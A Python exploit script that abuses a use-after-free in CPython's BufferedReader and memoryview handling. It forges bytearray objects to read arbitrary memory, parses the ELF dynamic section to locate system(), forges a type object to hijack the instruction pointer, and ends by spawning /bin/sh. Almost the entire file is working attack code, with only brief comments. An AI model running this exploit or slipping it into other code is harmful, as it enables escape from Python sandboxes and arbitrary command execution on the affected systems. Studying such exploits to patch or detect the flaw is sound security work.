#!/usr/bin/python3

# Get reference to io module
io = open.__self__

PAGE_SIZE = 4096
SIZEOF_ELF64_SYM = 24
SIZEOF_PLT_STUB = 16

def p64(x):
    s = bytearray()
    while x > 0:
        s.append(x & 0xff)
        x >>= 8
    return s.ljust(8, b'\0')

def uN(b):
    out = 0
    for i in range(len(b)):
        out |= (b[i] & 0xff) << i*8
    return out

def u64(x):
    assert len(x) == 8
    return uN(x)

def u32(x):
    assert len(x) == 4
    return uN(x)

def u16(x):
    assert len(x) == 2
    return uN(x)

def flat(*args):
    return b''.join(args)

class File(io._RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
    def readable(self):
        return True

class Exploit:
    def _create_fake_byte_array(self, addr, size):
        byte_array_obj = flat(
            p64(10),            # refcount
            p64(id(bytearray)), # type obj
            p64(size),          # ob_size
            p64(size),          # ob_alloc
            p64(addr),          # ob_bytes
            p64(addr),          # ob_start
            p64(0x0),           # ob_exports
        )
        self.no_gc.append(byte_array_obj)  # stop gc from freeing after return
        self.freed_buffer[0] = id(byte_array_obj) + 32

    def leak(self, addr, length):
        self._create_fake_byte_array(addr, length)
        return self.fake_objs[0][0:length]

    def set_rip(self, addr, obj_refcount=0x10):
        """Set rip by using a fake object and associated type object."""
        # Fake type object
        type_obj = flat(
            p64(0xac1dc0de),    # refcount
            b'X'*0x68,          # padding
            p64(addr)*100,      # vtable funcs 
        )
        self.no_gc.append(type_obj)

        # Fake PyObject
        data = flat(
            p64(obj_refcount),  # refcount
            p64(id(type_obj)),  # pointer to fake type object
        )
        self.no_gc.append(data)

        # The bytes data starts at offset 32 in the object 
        self.freed_buffer[0] = id(data) + 32

        try:
            # Now we trigger it. This calls tp_getattro on our fake type object
            self.fake_objs[0].trigger
        except:
            # Avoid messy error output when we exit our shell
            pass

    def find_bin_base(self):
        # Leak tp_dealloc pointer of PyLong_Type which points into the Python
        # binary.
        leak = self.leak(id(int), 32)
        cpython_binary_ptr = u64(leak[24:32])
        addr = (cpython_binary_ptr >> 12) << 12  # page align the address
        # Work backwards in pages until we find the start of the binary
        for i in range(10000):
            nxt = self.leak(addr, 4)
            if nxt == b'\x7fELF':
                return addr
            addr -= PAGE_SIZE
        return None

    def find_system(self):
        """
        Return either the address of the system PLT stub, or the address of 
        system itself if the binary is full RELRO.
        """
        bin_base = self.find_bin_base()
        data = self.leak(bin_base, 0x1000)

        # Parse ELF header
        type = u16(data[0x10:0x12])
        is_pie = type == 3
        phoff = u64(data[0x20:0x28])
        phentsize = u16(data[0x36:0x38])
        phnum = u16(data[0x38:0x3a])

        # Find .dynamic section
        dynamic = None
        for i in range(phnum):
            hdr_off = phoff + phentsize*i
            hdr = data[hdr_off:hdr_off + phentsize]
            p_type = u32(hdr[0x0:0x4])
            p_vaddr = u64(hdr[0x10:0x18])
            if p_type == 2:  # PT_DYNAMIC
                dynamic = p_vaddr
        
        if dynamic is None:
            print("[!!] Couldn't find PT_DYNAMIC section")
            return None
        
        if is_pie:
            dynamic += bin_base

        print('[*] .dynamic:   {}'.format(hex(dynamic)))
        dynamic_data = e.leak(dynamic, 500)

        # Parse the Elf64_Dyn entries, extracting what we need
        i = 0
        got = None
        symtab = None
        strtab = None
        rela = None
        init = None
        while True:
            d_tag = u64(dynamic_data[i*16:i*16 + 8])
            d_un = u64(dynamic_data[i*16 + 8:i*16 + 16])
            if d_tag == 0 and d_un == 0:
                break
            elif d_tag == 3:    # DT_PLTGOT
                got = d_un
            elif d_tag == 5:    # DT_STRTAB
                strtab = d_un
            elif d_tag == 6:    # DT_SYMTAB
                symtab = d_un
            elif d_tag == 12:   # DT_INIT
                init = d_un
            elif d_tag == 23:   # DT_JMPREL
                rela = d_un
            i += 1

        if got is None or strtab is None or symtab is None or rela is None or \
            init is None:
            print("[!!] Missing required info in .dynamic")
            return None
        
        if is_pie:
            init += bin_base

        print('[*] DT_SYMTAB:  {}'.format(hex(symtab)))
        print('[*] DT_STRTAB:  {}'.format(hex(strtab)))
        print('[*] DT_RELA:    {}'.format(hex(rela)))
        print('[*] DT_PLTGOT:  {}'.format(hex(got)))
        print('[*] DT_INIT:    {}'.format(hex(init)))

        # Walk the relocation table, for each entry we read the relevant symtab
        # entry and then strtab entry to get the function name.
        rela_data = e.leak(rela, 0x1000)
        i = 0
        while True:
            off = i * 24
            r_info = u64(rela_data[off + 8:off + 16])
            symtab_idx = r_info >> 32  # ELF64_R_SYM
            symtab_entry = e.leak(symtab + symtab_idx * 24, SIZEOF_ELF64_SYM)
            strtab_off = u32(symtab_entry[0:4])
            name = e.leak(strtab + strtab_off, 6)
            if name == b'system':
                print('[*] Found system at rela index {}'.format(i))
                system_idx = i
                break
            i += 1
        
        # Leak start of GOT data to determine if we're full RELRO
        got_data = self.leak(got, 32)
        link_map = u64(got_data[8:16])
        dl_runtime_resolve = u64(got_data[16:24])

        if link_map == 0 and dl_runtime_resolve == 0:
            # The binary is likely full RELRO, which means system will already
            # be resolved in the GOT.
            print('[*] Full RELRO binary, reading system address from GOT')
            system_got = 24 + got + system_idx*8
            func = u64(self.leak(system_got, 8))
            print('[*] system:     {}'.format(hex(func)))
            return func

        # Find the PLT. We know it is always placed after the init function, so 
        # scan forwards looking for the first opcode of PLT.
        init_data = self.leak(init, 64)
        plt_offset = None
        for i in range(0, len(init_data), 2):
            if init_data[i:i+2] == b'\xff\x35':  # push [rip+offset]
                plt_offset = i
                break

        if plt_offset is None:
            print('[!!] Start of PLT not found')
            return None

        plt = init + plt_offset + 16  # skip first PLT entry which is resolver

        # PLT stubs are in the same order as rela entries, so we can use the
        # known system index to calculate the address of the system PLT stub.
        system_plt = plt + system_idx*SIZEOF_PLT_STUB
        print('[*] system plt: {}'.format(hex(system_plt)))
        return system_plt

    def __init__(self):
        # Trigger bug
        global view
        f = io.BufferedReader(File())
        f.read(1)
        del f
        view = view.cast('P')

        self.fake_objs = [None] * len(view)
        self.freed_buffer = view
        self.no_gc = []


e = Exploit()
system = e.find_system()
# When we get rip control rdi contains a pointer to our fake object, who's first 
# 8 bytes are its refcount. We can repurpose the refcount as our command to 
# system. Note the refcount is incremented by 1 before the call, which is why we
# decrement the first character.
e.set_rip(system, obj_refcount=u64(b'\x2ebin/sh\x00'))